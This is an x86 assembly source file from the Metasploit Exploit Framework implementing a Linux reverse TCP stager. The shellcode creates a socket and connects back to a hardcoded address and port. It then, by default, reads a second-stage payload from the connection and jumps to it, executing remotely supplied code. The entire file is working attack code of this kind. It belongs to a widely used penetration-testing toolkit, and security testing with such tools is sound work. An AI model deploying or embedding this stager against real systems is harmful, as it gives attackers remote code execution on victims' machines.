;;
; 
;        Name: stager_sock_reverse
;   Qualities: Can Have Nulls
;   Platforms: Linux
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision$
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a Linux reverse TCP stager.
;
;        File descriptor in edi.
;
;;
BITS   32
GLOBAL _start

_start:
	xor  ebx, ebx

socket:
	push ebx
	inc  ebx
	push ebx
	push byte 0x2
	push byte 0x66
	pop  eax
	mov  ecx, esp
	int  0x80
	xchg eax, edi

connect:
	pop  ebx
	push dword 0x0100007f ; ip: 127.0.0.1
	push word 0xbfbf      ; port: 49087
	push bx
	mov  ecx, esp
	push byte 0x66
	pop  eax
	push eax
	push ecx
	push edi
	mov  ecx, esp
	inc  ebx
	int  0x80

%ifndef USE_SINGLE_STAGE

recv:
	pop  ebx
	cdq
	mov  dh, 0xc
	mov  al, 0x3
	int  0x80
	jmp  ecx

%endif
